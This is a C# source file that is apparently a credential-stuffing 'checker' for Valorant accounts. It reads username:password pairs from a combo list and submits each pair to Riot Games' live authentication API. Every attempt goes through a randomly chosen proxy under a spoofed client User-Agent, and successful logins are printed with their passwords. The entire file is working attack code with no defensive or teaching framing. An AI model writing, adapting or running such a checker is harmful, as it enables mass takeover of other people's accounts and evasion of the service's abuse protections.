using RiotCloudflareAuthFix;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http.Headers;
using System.Threading.Tasks;
using System.Windows;

namespace NetValorant
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {

            foreach (var item in File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)+"\\Combolist.txt"))
            {
                string[] data = item.Split(':');

                string username = data[0].ToString();
                string password = data[1].ToString();

                var control = Check(username, password);
            }


            Console.Read();
        }
        public static string randomproxy()
        {
            string res = null;

            var lines = File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Proxylist.txt");
            var r = new Random();
            var randomLineNumber = r.Next(0, lines.Length - 1);
            var line = lines[randomLineNumber];

            return res = lines[randomLineNumber];
        }
        public static async Task Check(string username, string password)
        {

            var client = new AuthenticationJsonClient
            {
                proxy = new WebProxy(randomproxy())
            };

            client.DefaultRequestHeaders.Add("User-Agent", "RiotClient/44.0.1.4223069.4190634 rso-auth (Windows;10;;Professional, x64)");
            
     
            var authCookiesRequestResult = await client.PostAsync<object>(
                new Uri("https://auth.riotgames.com/api/v1/authorization"),
                new
                {
                    client_id = "play-valorant-web-prod",
                    redirect_uri = "https://playvalorant.com/opt_in",
                    response_type = "token id_token",
                    response_mode = "query",
                    scope = "account openid",
                    nonce = 1,
                }
            );

            var authCookies = ParseSetCookie(authCookiesRequestResult.Message.Headers);

            var authRequestResult = await client.PutAsync<object>(
                new Uri("https://auth.riotgames.com/api/v1/authorization"),
                new
                {
                    username,
                    password,
                    type = "auth"
                },
                cookies: authCookies
            );

            string veri = await authRequestResult.Message.Content.ReadAsStringAsync();

            if (veri.Contains("auth_failure"))
            {
                Console.WriteLine("[-] " + username);
            }
            else if (veri.Contains("access_token"))
            {
                Console.WriteLine("[+] " + password);
            }
            else
            {
                Console.Write(veri);
            }


            IEnumerable<Cookie> ParseSetCookie(HttpHeaders headers)
            {
                if (headers.TryGetValues("Set-Cookie", out var cookies))
                {
                    return cookies.Select(cookie => cookie.Split('=', 2))
                        .Select(cookieParts => new Cookie(cookieParts[0], cookieParts[1]));
                }
                return Enumerable.Empty<Cookie>();
            }
        }
    }
}
